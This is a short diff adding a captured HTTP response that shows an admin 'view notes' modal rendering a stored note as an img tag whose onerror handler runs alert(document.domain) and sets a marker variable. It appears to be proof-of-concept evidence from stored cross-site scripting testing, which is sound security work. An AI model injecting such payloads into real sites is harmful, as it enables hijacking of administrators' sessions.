@@ -1,0 +1,10 @@
+HTTP/1.1 200
+
+... region around the stored note in the admin's viewnotes modal ...
+
+<h1 class="title title--modal">View notes for target_4ba2e90f</h1>
+        <div class="modal_content">
+            <div class="block__content"><img src=x onerror="alert(document.domain);window.__xss='xssb6e977'"></div>
+        </div>
+    </section>
+</div>
